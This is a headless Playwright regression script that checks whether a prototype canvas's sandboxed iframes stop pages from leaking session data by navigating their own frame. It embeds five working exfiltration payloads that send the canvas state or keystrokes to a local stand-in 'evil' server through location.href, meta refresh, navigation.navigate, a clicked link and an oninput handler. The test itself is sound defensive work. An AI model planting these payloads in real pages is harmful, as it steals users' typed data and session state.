// Headless check that a prototype page cannot leak data by navigating its own frame.
//
//   node scripts/page-leak.mjs                       start Vite + the sandbox server on free ports, expect "blocked"
//   node scripts/page-leak.mjs --app http://localhost:5291 [--expect leak]
//                                                    test an app that is already running (an older checkout)
//
// A throwaway "evil" server on 127.0.0.1 records every request. Evil pages are added to the canvas
// as idle thumbnails (no click) and try to send the session state (a name typed into another page)
// to it: `location = …`, a meta refresh, `navigation.navigate`, a clicked link. One more types into
// an interactive page and leaks on every keystroke. Exit code 1 if the result differs from --expect.

import http from 'node:http';
import net from 'node:net';
import { spawn } from 'node:child_process';
import { chromium } from 'playwright-core';

const args = process.argv.slice(2);
const opt = (name, dflt) => (args.includes(name) ? args[args.indexOf(name) + 1] : dflt);
const expect = opt('--expect', 'blocked');
const freePort = () => new Promise((r) => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });

// ---- the evil server
const hits = [];
const evilPort = Number(opt('--evil-port', 0)) || (await freePort());
http
  .createServer((req, res) => {
    hits.push(req.url);
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end('<h1 style="color:red">EVIL SITE</h1>');
  })
  .listen(evilPort, '127.0.0.1');
const EVIL = `http://127.0.0.1:${evilPort}`;

// ---- the app (ours, or one already running)
let appUrl = opt('--app');
const stops = [];
if (!appUrl) {
  const sbx = Number(opt('--sandbox-port', 0)) || (await freePort());
  const srv = spawn(process.execPath, ['sandbox/server.mjs', '--port', String(sbx)], { stdio: ['ignore', 'pipe', 'inherit'] });
  stops.push(() => srv.kill());
  await new Promise((r) => srv.stdout.once('data', r));
  process.env.VITE_SANDBOX_URL = `http://{label}.localhost:${sbx}`;
  const { createServer } = await import('vite');
  const vite = await createServer({ server: { port: Number(opt('--app-port', 0)), host: '127.0.0.1' }, logLevel: 'error' });
  await vite.listen();
  stops.push(() => vite.close());
  appUrl = `http://localhost:${vite.httpServer.address().port}`;
}

const state = `JSON.stringify(canvas.state)`;
const evil = {
  location: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/location?s=' + encodeURIComponent(${state});</script>`,
  meta: `<h1>Innocent</h1><script>const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${EVIL}/meta?s=' + encodeURIComponent(${state}); document.head.append(m);</script>`,
  navigation: `<h1>Innocent</h1><script>navigation.navigate(${JSON.stringify(EVIL)} + '/navigation?s=' + encodeURIComponent(${state}));</script>`,
  link: `<h1>Innocent</h1><script>const a = document.createElement('a'); a.href = ${JSON.stringify(EVIL)} + '/link?s=' + encodeURIComponent(${state}); document.body.append(a); a.click();</script>`,
  typed: `<input id="i" placeholder="type here"><script>i.oninput = () => { location.href = ${JSON.stringify(EVIL)} + '/typed?v=' + encodeURIComponent(i.value); };</script>`,
};

const browser = await chromium.launch({ channel: 'chrome', headless: true });
let code = 0;
try {
  const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
  const errors = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  await page.goto(appUrl);
  await page.waitForFunction(() => window.app?.dispatch, null, { timeout: 30_000 });
  await page.evaluate(() => {
    app.store.load({ nodes: [], edges: [] });
    app.dispatch('page.seed', { x: 0, y: 0 });
  });
  const seeded = await page.evaluate(() => app.doc.nodes.map((n) => [n.id, n['x-page']?.title]).filter((x) => x[1]));
  const signup = seeded.find((x) => x[1] === 'Sign up')?.[0];
  if (!signup) throw new Error('seed has no Sign up page');

  // put "Ada" into the session state the way a person would: interact with the Sign up page and type
  await page.evaluate(() => app.view.fit());
  const box = page.locator(`[data-node-id="${signup}"]`);
  await box.locator('[data-action="live"]').click();
  const form = box.frameLocator('iframe');
  await form.locator('[data-store="name"]').fill('Ada Secret');
  await page.waitForTimeout(300);

  // the evil pages, as idle thumbnails
  await page.evaluate((evil) => {
    let i = 0;
    for (const [k, html] of Object.entries(evil)) app.dispatch('page.create', { x: 1800 + (i++) * 260, y: 0, title: 'Evil ' + k, html });
  }, evil);
  await page.waitForTimeout(3000);
  const idle = [...hits];

  // typing into an interactive evil page
  const typedId = await page.evaluate(() => app.doc.nodes.find((n) => n['x-page']?.title === 'Evil typed').id);
  await page.evaluate((id) => { app.store.select([id]); app.view.fit([id]); }, typedId);
  const t = page.locator(`[data-node-id="${typedId}"]`);
  await t.locator('[data-action="live"]').click();
  await t.frameLocator('iframe').locator('#i').pressSequentially('hunter2', { delay: 60 });
  await page.waitForTimeout(1500);

  const leaked = (name) => hits.filter((h) => h.startsWith('/' + name));
  const rows = Object.keys(evil).map((k) => [k, leaked(k)]);
  for (const [k, l] of rows) console.log(`${k.padEnd(11)} ${l.length ? 'LEAK  ' + decodeURIComponent(l[0]).slice(0, 90) : 'blocked'}`);
  console.log(`idle thumbnails: ${idle.length} request(s) to the evil server; after typing: ${hits.length}`);
  if (errors.length) console.log('page errors:', errors.join(' | '));
  const anyLeak = hits.length > 0;
  const anyIdle = idle.length > 0;
  const ok = expect === 'leak' ? anyLeak && anyIdle : !anyLeak;
  console.log(ok ? `OK (expected ${expect})` : `FAIL (expected ${expect})`);
  if (!ok) code = 1;
} catch (e) {
  console.error(e);
  code = 1;
} finally {
  await browser.close();
  for (const s of stops) await s();
  setTimeout(() => process.exit(code), 100);
}
